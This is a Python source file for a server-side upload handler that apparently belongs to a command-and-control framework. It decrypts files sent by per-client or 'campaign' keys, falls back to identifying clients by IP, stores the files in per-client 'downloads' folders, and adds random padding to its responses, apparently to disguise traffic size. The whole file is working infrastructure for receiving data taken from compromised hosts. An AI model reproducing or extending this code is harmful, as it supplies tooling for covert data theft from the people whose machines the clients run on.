import os
import time
import json
import base64
import logging
from handlers.base_handler import BaseHandler

logger = logging.getLogger(__name__)

class FileHandler(BaseHandler):
    """Handler for file uploads from clients to server"""
    
    def handle(self):
        """Process file upload from client to server (client uploads, server receives)"""
        # Get content data
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_error_response(400, "Missing content")
            return
            
        request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
        
        try:
            # Parse the request JSON to extract data part
            request_json = json.loads(request_body)
            encrypted_data = request_json.get('d') or request_json.get('data')
            
            # Handle token field (discard padding - we don't need it)
            token = request_json.get('t', '') or request_json.get('token', '')
            if token:
                self.log_message(f"Received file upload with {len(token)} bytes of token padding")
            
            # Try client identification by key-based decryption
            client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
            
            # If client identification failed but client_id was provided in request
            if client_id is None:
                provided_client_id = request_json.get('c') or request_json.get('client_id') or request_json.get('id')
                
                if provided_client_id:
                    # Try decryption using the provided client ID
                    try:
                        decrypted_data = self.crypto_helper.decrypt(encrypted_data, provided_client_id)
                        client_id = provided_client_id
                    except Exception as e:
                        logger.error(f"Failed to decrypt using provided client ID: {e}")
            
            if client_id is None or decrypted_data is None:
                self.send_error_response(400, "Authentication failed - could not decrypt data")
                return
            
            # Save the file
            file_path = self._save_file_from_client(client_id, decrypted_data)
            
            # Prepare success response with proper structure
            success_response = {
                "Status": "Success",
                "Message": f"File received successfully and saved to {file_path}",
                "FilePath": file_path
            }
            
            # Encrypt the response
            encrypted_response = self.crypto_helper.encrypt(json.dumps(success_response), client_id)
            
            # Add token padding
            token_padding = self._generate_token_padding()
            
            # Send encrypted response with standardized structure
            self.send_response(200, "application/json", json.dumps({
                "d": encrypted_response,  # Shortened from 'data'
                "t": token_padding        # Shortened from 'token'
            }))
            
        except json.JSONDecodeError:
            # For backward compatibility, try directly as encrypted data
            try:
                # Use IP-based identification as fallback (less secure)
                client_id = self._identify_client_by_ip()
                
                if client_id:
                    # Try to decrypt using the client's key
                    decrypted_data = self.crypto_helper.decrypt(request_body, client_id)
                else:
                    # Try using the campaign key
                    decrypted_data = self.crypto_helper.decrypt(request_body)
                    client_id = self._identify_client_by_ip()  # Still need a client ID for saving
                
                # Save the file
                file_path = self._save_file_from_client(client_id or self.client_address[0], decrypted_data)
                
                # Prepare and encrypt success response
                success_response = {
                    "Status": "Success",
                    "Message": f"File received successfully and saved to {file_path}",
                    "FilePath": file_path
                }
                
                if client_id:
                    encrypted_response = self.crypto_helper.encrypt(json.dumps(success_response), client_id)
                else:
                    encrypted_response = self.crypto_helper.encrypt(json.dumps(success_response))
                
                # Add token padding
                token_padding = self._generate_token_padding()
                
                # Send response with standardized structure
                self.send_response(200, "application/json", json.dumps({
                    "d": encrypted_response,
                    "t": token_padding
                }))
            except Exception as e:
                logger.error(f"Error handling legacy file upload: {e}")
                self.send_error_response(500, "Server Error")
        except Exception as e:
            logger.error(f"Error handling file upload: {e}")
            
            # Try to send an encrypted error response if we have a client ID
            try:
                error_response = {
                    "Status": "Error",
                    "Message": f"Error processing file upload: {str(e)}"
                }
                
                if client_id:
                    encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response), client_id)
                    token_padding = self._generate_token_padding()
                    self.send_response(200, "application/json", json.dumps({
                        "d": encrypted_error,
                        "t": token_padding
                    }))
                else:
                    self.send_error_response(500, "Server Error")
            except:
                self.send_error_response(500, "Server Error")
    
    def _generate_token_padding(self):
        """Generate random token padding for responses"""
        import random
        import string
        
        # Generate a random length between 50 and 500 characters
        padding_length = random.randint(50, 500)
        
        # Generate random padding content
        chars = string.ascii_letters + string.digits
        padding = ''.join(random.choice(chars) for _ in range(padding_length))
        
        return padding
    
    def _identify_client_by_ip(self):
        """Identify client based on IP address as fallback"""
        client_ip = self.client_address[0]
        for client_id, client_info in self.client_manager.get_clients_info().items():
            if client_info.get('ip') == client_ip:
                return client_id
        return None
            
    def _save_file_from_client(self, client_id, file_content):
        """Save file content received from client to server's downloads folder"""
        # Prepare the downloads directory for files coming FROM client TO server
        campaign_folder = self.get_campaign_folder()
        
        # Use client_id if available, otherwise use IP
        client_id_for_path = client_id or self.client_address[0]
        
        # Files from client to server go in the downloads folder
        downloads_folder = os.path.join(campaign_folder, "downloads", client_id_for_path)
        os.makedirs(downloads_folder, exist_ok=True)
        
        # Try to parse as JSON for structured file upload
        try:
            # First check if the data is a string that needs to be parsed as JSON
            if isinstance(file_content, str):
                try:
                    file_info = json.loads(file_content)
                except json.JSONDecodeError as e:
                    self.log_message(f"Error parsing JSON: {e}, content: {file_content[:100]}...")
                    # Not valid JSON, save as raw text
                    return self._save_raw_file_from_client(downloads_folder, file_content, client_id)
            else:
                # Already parsed JSON
                file_info = file_content
            
            # Check if it's a structured file upload
            if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                # This is a structured file upload with filename and base64 content
                file_path = self._save_structured_file_from_client(downloads_folder, file_info, client_id)
                return file_path
            else:
                # Not a structured file upload, save as raw text
                return self._save_raw_file_from_client(downloads_folder, str(file_content), client_id)
        except Exception as e:
            self.log_message(f"Error in _save_file_from_client: {e}")
            # Fallback to saving as raw text
            try:
                return self._save_raw_file_from_client(downloads_folder, str(file_content), client_id)
            except Exception as e2:
                self.log_message(f"Error saving raw file: {e2}")
                # Create an error file
                error_path = os.path.join(downloads_folder, f"error_{int(time.time())}.txt")
                with open(error_path, 'w') as f:
                    f.write(f"Error saving file: {e}\nSecondary error: {e2}\n")
                return error_path
                
    def _save_structured_file_from_client(self, downloads_folder, file_info, client_id=None):
        """Save a structured file received from a client"""
        file_name = file_info['FileName']
        file_content_base64 = file_info['FileContent']
        
        try:
            # Sanitize filename to prevent directory traversal attacks
            file_name = os.path.basename(file_name).replace('..', '_')
            
            # Decode base64 content
            file_content_bytes = base64.b64decode(file_content_base64)
            
            # Save to file in downloads folder (this is data coming FROM client TO server)
            file_path = os.path.join(downloads_folder, file_name)
            with open(file_path, 'wb') as f:
                f.write(file_content_bytes)
            
            # Log the file receipt
            self.log_message(f"File received from {client_id or self.client_address[0]}: {file_name} ({len(file_content_bytes)} bytes)")
            if client_id:
                self.client_manager.log_event(client_id, "File Received", f"File from client saved to {file_path}")
                
            return file_path
        except Exception as e:
            logger.error(f"Error saving file from client: {e}")
            raise
            
    def _save_raw_file_from_client(self, downloads_folder, content, client_id=None):
        """Save raw text content received from a client"""
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        file_path = os.path.join(downloads_folder, f"received_{timestamp}.txt")
        
        try:
            # Try writing with utf-8 first
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(content)
        except UnicodeEncodeError:
            # Fall back to ascii with encoding error replacement
            with open(file_path, 'w', encoding='ascii', errors='replace') as f:
                f.write(content)
            
        self.log_message(f"Raw text received from {client_id or self.client_address[0]} and saved to {file_path}")
        if client_id:
            self.client_manager.log_event(client_id, "File Received", f"Raw text from client saved to {file_path}")
            
        return file_path